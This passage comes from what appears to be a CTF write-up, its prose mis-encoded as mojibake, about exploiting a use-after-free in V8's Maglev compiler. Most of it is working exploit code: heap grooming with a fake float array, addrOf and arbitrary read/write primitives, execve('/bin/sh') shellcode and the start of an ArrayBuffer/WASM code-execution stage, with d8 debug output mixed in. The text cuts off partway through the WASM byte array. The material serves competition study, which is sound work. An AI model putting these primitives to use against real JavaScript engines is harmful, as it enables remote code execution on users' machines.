<p>v0 æœ€çµ‚æœƒæŒ‡å‘ä¸€å¡Šè¢« Free æ‰çš„ Memory<br>æˆ‘å€‘å¯ä»¥æ‹¿å›é‚£å¡Š memory ä¸¦åœ¨ä¸Šé¢å½é€  Float Array<br>åœ¨ GC å¾Œï¼ŒObject Address çš„ä½ 32 bits æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ %DebugPrint() æ‹¿å‡ºä¾†ä¸ç”¨ leak</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">scavenge_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line">fake_object_helper = [<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">6.699586332753336e-309</span>, <span class="number">2.7815821086593595e-308</span>, <span class="number">8.34402697134475e-309</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x0004d149, 0x0004d149));  -&gt; 6.699586332753336e-309</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x00140071)); -&gt; 2.7815821086593595e-308</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x60000, 0x60000)); -&gt; 8.34402697134475e-309</span></span><br></pre></td></tr></table></figure>
<p>æŠŠå½é€ çš„ Float Array Element æŒ‡åˆ° Object Array Element å°±å¯ä»¥ç©©å®š leak Object Address<br>æŒ‡åˆ° &lt;address - 0x8&gt; å°±å¯ä»¥ä»»æ„è®€å¯« &lt;address&gt; ä¸Šçš„è³‡æ–™</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">console.log(helpers.pair_i32_to_f64(0x000007bd, 0x001c0011)); -&gt; 3.8939153263170276e-308</span></span><br><span class="line"><span class="comment">DebugPrint: 0x385900063051: [JSArray] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x38590004d105 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; [HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 196608</span></span><br><span class="line"><span class="comment"> - properties: 0x3859000007bd &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - All own properties (excluding elements): &#123;</span></span><br><span class="line"><span class="comment">    0x385900000df1: [String] in ReadOnlySpace: #length: 0x385900026839 &lt;AccessorInfo name= 0x385900000df1 &lt;String[6]: #length&gt;, data= 0x385900000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; &#123;</span></span><br><span class="line"><span class="comment">    0-196607: 0x3859000067b9 &lt;the_hole_value&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = <span class="number">3.8939153263170276e-308</span>;</span><br><span class="line">    addrOf_helper[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead32</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead64</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ç‚ºæ²’æœ‰é–‹ Heap Sandboxï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç¶“å…¸çš„ ArrayBuffer + WASM trick é”æˆ RCE<br>ä½†è¦æ”¹çš„ Offset è·Ÿå‚³çµ± Writeup æåˆ°çš„ä¸å¤ªä¸€æ¨£ï¼Œæˆ‘é€™é‚Šæ˜¯æ‹¿ gdb æ…¢æ…¢æ‰¾ offset</p>
<p>###s Exploit<br>For Ubuntu 22.04</p>
<p>ä¸€é–‹å§‹åœ¨å¯« Exploit çš„æ™‚å€™è »ç©©å®šçš„ï¼ŒæˆåŠŸç‡å¤§æ¦‚æœ‰ 70%ï¼Œæ‰€ä»¥å°±é–‹å§‹åŒ… Docker<br>ç­‰åˆ°æ¯”è³½å‰ä¸€å¤©ä¸»è¾¦æ–¹çµ¦äº† GCP è®“æˆ‘å€‘æ¶é¡Œç›®ï¼Œçµæœç™¼ç¾ Exploit åœ¨ GCP ä¸Šçš„æˆåŠŸç‡è®Šä½éå¸¸å¤š<br>ç”¨ %DebugPrint() çœ‹äº†ä¸€ä¸‹ç™¼ç¾ Heap Number è·Ÿ Array çš„ä½ç½®å·®çš„æ¯”é æœŸå¤šå¾ˆå¤šå°è‡´ Fake Float Array Object å¤±æ•—</p>
<p>æˆ‘æ‡·ç–‘æ˜¯æ©Ÿå™¨çš„ RAM å¤ªå°å°è‡´çš„ï¼Œæ‰€ä»¥å°±é–‹å§‹åœ¨åŸæœ¬å¯« Exploit çš„ç’°å¢ƒæ¸¬<br>æŠŠ RAM å¾ 64 GB èª¿æˆ 4 GB å¾Œç™¼ç¾æˆåŠŸç‡ç¢ºå¯¦é™ä½å¾ˆå¤šï¼Œä½†ç•¶æˆ‘æŠŠ RAM å¾ 64GB æ”¹å› 4GB å¾Œï¼ŒæˆåŠŸç‡ä¹Ÿæ²’æœ‰è®Šå›ä¾†</p>
<p>æˆ‘ Debug äº†8å°æ™‚é‚„æ˜¯æ²’æ‰¾å‡ºåŸå› ï¼Œ<del>æœ€å¾Œæ±ºå®šå¤šé€å¹¾é Exploit</del><br><del>çœ‹èµ·ä¾†æ˜¯æˆ‘ Exploit å¯«å¤ªçˆ›å°è‡´ Heap Spray ä¸ç©©å®š</del><br><img src="/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/exp.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Helpers</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">dv</span>  = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u8</span>  = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span> = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span> = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f32</span> = <span class="keyword">new</span> <span class="title class_">Float32Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span> = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="variable language_">this</span>.<span class="property">buf</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">index</span> 	 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">pair_i32_to_f64</span>(<span class="params">p1, p2</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>] = p1;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>] = p2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">i64tof64</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">f64toi64</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">set_i64</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set_l</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">set_h</span>(<span class="params">i</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_i64</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u64</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ftoil</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ftoih</span>(<span class="params">f</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">f64</span>[<span class="number">0</span>] = f;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">u32</span>[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">printhex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">breakpoint</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">slice</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    v0 = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mark_sweep_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scavenge_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        arr[i] = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addrOf_helper = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x30000</span>);</span><br><span class="line"><span class="keyword">var</span> helpers = <span class="keyword">new</span> <span class="title class_">Helpers</span>();</span><br><span class="line"><span class="keyword">var</span> fake_object_helper;</span><br><span class="line"><span class="keyword">let</span> v0 = <span class="number">48763</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">f</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">scavenge_gc</span>();</span><br><span class="line"><span class="title function_">mark_sweep_gc</span>();</span><br><span class="line"></span><br><span class="line">fake_object_helper = [<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">6.699586332753336e-309</span>, <span class="number">2.7815821086593595e-308</span>, <span class="number">8.34402697134475e-309</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x0004d149, 0x0004d149));  -&gt; 6.699586332753336e-309</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x00140071)); -&gt; 2.7815821086593595e-308</span></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x60000, 0x60000)); -&gt; 8.34402697134475e-309</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 100011000007bd</span></span><br><span class="line"><span class="keyword">var</span> fake_array = v0;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] fake_array.length : 0x&#x27;</span> + fake_array.<span class="property">length</span>.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x001c0011)); -&gt; 3.8939153263170276e-308 </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">terry1234@terry1234-virtual-machine:~/v8/out/hitcon_ctf$ ./d8 --allow-natives-syntax poc.js  </span></span><br><span class="line"><span class="comment">DebugPrint: 0x385900063051: [JSArray] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x38590004d105 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; [HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 196608</span></span><br><span class="line"><span class="comment"> - properties: 0x3859000007bd &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - All own properties (excluding elements): &#123;</span></span><br><span class="line"><span class="comment">    0x385900000df1: [String] in ReadOnlySpace: #length: 0x385900026839 &lt;AccessorInfo name= 0x385900000df1 &lt;String[6]: #length&gt;, data= 0x385900000011 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3859001c0011 &lt;FixedArray[196608]&gt; &#123;</span></span><br><span class="line"><span class="comment">    0-196607: 0x3859000067b9 &lt;the_hole_value&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">0x38590004d105: [Map] in OldSpace</span></span><br><span class="line"><span class="comment"> - map: 0x3859000448d5 &lt;MetaMap (0x385900044925 &lt;NativeContext[300]&gt;)&gt;</span></span><br><span class="line"><span class="comment"> - type: JS_ARRAY_TYPE</span></span><br><span class="line"><span class="comment"> - instance size: 16</span></span><br><span class="line"><span class="comment"> - inobject properties: 0</span></span><br><span class="line"><span class="comment"> - unused property fields: 0</span></span><br><span class="line"><span class="comment"> - elements kind: HOLEY_SMI_ELEMENTS</span></span><br><span class="line"><span class="comment"> - enum length: invalid</span></span><br><span class="line"><span class="comment"> - back pointer: 0x38590004ca85 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt;</span></span><br><span class="line"><span class="comment"> - prototype_validity_cell: 0x385900000ac9 &lt;Cell value= [cleared]&gt;</span></span><br><span class="line"><span class="comment"> - instance descriptors #1: 0x38590004d0c9 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"><span class="comment"> - transitions #1: 0x38590004d12d &lt;TransitionArray[5]&gt;</span></span><br><span class="line"><span class="comment">   Transitions #1:</span></span><br><span class="line"><span class="comment">     0x385900000e8d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to PACKED_DOUBLE_ELEMENTS) -&gt; 0x38590004d149 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt;</span></span><br><span class="line"><span class="comment"> - prototype: 0x38590004caad &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - constructor: 0x38590004c9d5 &lt;JSFunction Array (sfi = 0x385900195c09)&gt;</span></span><br><span class="line"><span class="comment"> - dependent code: 0x3859000007cd &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span></span><br><span class="line"><span class="comment"> - construction counter: 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = <span class="number">3.8939153263170276e-308</span>;</span><br><span class="line">    addrOf_helper[<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead32</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead64</span>(<span class="params">where</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> helpers.<span class="title function_">f64toi64</span>(fake_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    fake_object_helper[<span class="number">5</span>] = helpers.<span class="title function_">pair_i32_to_f64</span>(<span class="number">0x000007bd</span>, <span class="title class_">Number</span>(where) - <span class="number">8</span>);</span><br><span class="line">    fake_array[<span class="number">0</span>] = helpers.<span class="title function_">i64tof64</span>(what);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* calc</span></span><br><span class="line"><span class="comment">var sc_arr = [</span></span><br><span class="line"><span class="comment">    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,</span></span><br><span class="line"><span class="comment">    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,</span></span><br><span class="line"><span class="comment">    0x1485e086a56f631n,    0x313b68e6894856e6n,    0x101012434810101n,    0x4c50534944b84801n,</span></span><br><span class="line"><span class="comment">    0x6a52d231503d5941n,    0x894852e201485a08n,    0x50f583b6ae2n,</span></span><br><span class="line"><span class="comment">];*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">  <span class="number">0x732f6e69622fb848n</span>,  <span class="comment">// mov rax, 0x0068732f6e69622f</span></span><br><span class="line">  <span class="number">0x3148e78948500068n</span>,  <span class="comment">// push rax ; mov rdi,rsp ; xor rsi,rsi</span></span><br><span class="line">  <span class="number">0x3bc0c748d23148f6n</span>,  <span class="comment">// xor rdx,rdx ; mov rax,59</span></span><br><span class="line">  <span class="number">0x909090050f000000n</span>,  <span class="comment">// syscall ; NOP,NOP,NOP (padding)</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> dataview_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(sc_arr.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(dataview_buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addrOf</span>(dataview_buffer) + <span class="number">0x24n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span 